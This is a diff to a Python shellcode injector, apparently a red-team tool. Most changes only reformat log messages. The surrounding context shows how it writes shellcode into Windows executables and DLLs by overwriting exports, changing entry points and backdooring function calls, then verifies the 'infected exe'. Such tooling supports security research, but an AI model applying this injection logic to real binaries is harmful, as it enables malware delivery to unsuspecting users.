@@ -114,7 +114,8 @@ class Injector():
         exe_out = self.settings.inject_exe_out
         carrier_invoke_style: CarrierInvokeStyle = self.settings.carrier_invoke_style
 
-        logger.info("-[ Injecting into {} -> {}".format(exe_in, exe_out))
+        logger.info("-[ Injecting Carrier".format())
+        logger.info("    Injectable: {} -> {}".format(exe_in, exe_out))
 
         # Patch IAT (if necessary and wanted)
         self.injectable_patch_iat()
@@ -124,7 +125,7 @@ class Injector():
 
         # Special case: DLL exported function direct overwrite
         if self.superpe.is_dll() and self.settings.dllfunc != "" and carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
-            logger.warning("---[ Inject DLL: Overwrite exported function {} with shellcode".format(self.settings.dllfunc))
+            logger.warning("      Inject DLL: Overwrite exported function {} with shellcode".format(self.settings.dllfunc))
             rva = self.superpe.getExportEntryPoint(self.settings.dllfunc)
 
             # Size and sanity checks
@@ -136,13 +137,13 @@ class Injector():
 
             # Inject
             carrier_offset = self.superpe.get_offset_from_rva(rva)
-            logger.info(f'----[ Using DLL Export "{self.settings.dllfunc}" at RVA 0x{rva:X} offset 0x{carrier_offset:X} to overwrite')
+            logger.info(f'-      Using DLL Export "{self.settings.dllfunc}" at RVA 0x{rva:X} offset 0x{carrier_offset:X} to overwrite')
             self.superpe.pe.set_bytes_at_offset(carrier_offset, self.carrier_shc)
 
         else:  # EXE/DLL
             carrier_offset = self.superpe.get_offset_from_rva(self.carrier_rva)
             #logger.info("{} {}".format(self.carrier_rva, carrier_offset))
-            logger.info("--( Inject: Write Carrier to 0x{:X} (0x{:X})".format(
+            logger.info("    Inject: Write Carrier to 0x{:X} (0x{:X})".format(
                 self.carrier_rva, carrier_offset))
 
             # Copy the carrier
@@ -156,27 +157,27 @@ class Injector():
 
                 elif carrier_invoke_style == CarrierInvokeStyle.BackdoorCallInstr:
                     addr = self.superpe.getExportEntryPoint(self.settings.dllfunc)
-                    logger.info("---( Inject DLL: Backdoor {} (0x{:X})".format(
+                    logger.info("      Inject: Backdoor DLL {} (0x{:X})".format(
                         self.settings.dllfunc, addr))
                     self.function_backdoorer.backdoor_function(
                         addr, self.carrier_rva, carrier_shc_len)
 
             else: # EXE
                 if carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
-                    logger.info("--( Inject EXE: Change Entry Point to 0x{:X}".format(
+                    logger.info("    Inject: Change Entry Point to 0x{:X}".format(
                         self.carrier_rva))
                     self.superpe.set_entrypoint(self.carrier_rva)
 
                 elif carrier_invoke_style == CarrierInvokeStyle.BackdoorCallInstr:
                     addr = self.superpe.get_entrypoint()
-                    logger.info("--( Inject EXE: Backdoor function at entrypoint (0x{:X})".format(
+                    logger.info("    Inject EXE: Backdoor function at entrypoint (0x{:X})".format(
                         addr))
                     self.function_backdoorer.backdoor_function(
                         addr, self.carrier_rva, carrier_shc_len)
 
-        logger.info("--( Fix imports and make carrier reference IAT")
+        logger.info("    Fix imports and make carrier reference IAT")
         self.injectable_write_iat_references()
-        logger.info("--( Insert and reference carrier data")
+        logger.info("    Insert and reference carrier data")
         self.inject_and_reference_data()
 
         # changes from console to UI (no console window) if necessary
@@ -188,7 +189,7 @@ class Injector():
         self.superpe.pe.OPTIONAL_HEADER.CheckSum = new_checksum
 
         # We done
-        logger.info("--( Write to file: {}".format(exe_out))
+        logger.info("-[ Write to file: {}".format(exe_out))
         self.superpe.write_pe_to_file(exe_out)
 
         # Log
@@ -198,13 +199,13 @@ class Injector():
 
 
     def injectable_patch_iat(self):
-        logger.info("--( Checking if IAT entries required by carrier are available")
+        logger.info("    Checking if IAT entries required by carrier are available")
         # Patch IAT (if necessary and wanted)
         for iatRequest in self.injectable.get_all_iat_requests():
             # skip available
             addr = self.superpe.get_vaddr_of_iatentry(iatRequest.name)
             if addr != None:
-                logger.debug("---[ Request IAT {} is available at 0x{:X}".format(
+                logger.debug("      Request IAT {} is available at 0x{:X}".format(
                     iatRequest.name, addr))
                 continue
             iat_name = self.superpe.get_replacement_iat_for("KERNEL32.dll", iatRequest.name)
@@ -265,9 +266,8 @@ class Injector():
             return
         
         # insert data
-        logger.info("--( DataReuseFixups: Inject the data")
         for datareuse_fixup in reusedata_fixups:
-            logger.debug("     Handling DataReuse Fixup: {} (.code: {})".format(
+            logger.debug("      Handling DataReuse Fixup: {} (.code: {})".format(
                 datareuse_fixup.string_ref, datareuse_fixup.in_code))
 
             if datareuse_fixup.in_code:  # .text
@@ -277,7 +277,7 @@ class Injector():
                 if payload_rva == None:
                     raise Exception("DataReuseFixup: payload_rva is None")
                 datareuse_fixup.addr = payload_rva + self.injectable.superpe.get_image_base()
-                logging.debug("       Add to .text at 0x{:X} ({}): {} with size {}".format(
+                logging.debug("        Add to .text at 0x{:X} ({}): {} with size {}".format(
                     datareuse_fixup.addr, payload_rva, datareuse_fixup.string_ref, len(datareuse_fixup.data)))
 
             else:  # .rdata
@@ -294,11 +294,11 @@ class Injector():
                 self.superpe.pe.set_bytes_at_rva(data_rva, var_data)
                 datareuse_fixup.addr = data_rva + self.injectable.superpe.get_image_base()
                 ##
-                logging.debug("       Add to .rdata at 0x{:X} ({}): {}: {}".format(
+                logging.debug("        Add to .rdata at 0x{:X} ({}): {}: {}".format(
                     datareuse_fixup.addr, data_rva, datareuse_fixup.string_ref, ui_string_decode(var_data)))
 
         # replace the placeholder in .text with a LEA instruction to the data we written above
-        logger.info("--( Datareusefixups: patch code to reference the data")
+        logger.info("    Datareusefixups: patch code to reference the data")
         code = self.superpe.get_code_section_data()
         for datareuse_fixup in reusedata_fixups:
             ref: DataReuseReference
@@ -327,7 +327,7 @@ class Injector():
 
 
 def verify_injected_exe(exefile: FilePath, dllfunc="") -> int:
-    logger.info("---[ Verify infected exe: {} ".format(exefile))
+    logger.info("      Verify infected exe: {} ".format(exefile))
     # remove indicator file
     pathlib.Path(VerifyFilename).unlink(missing_ok=True)
 
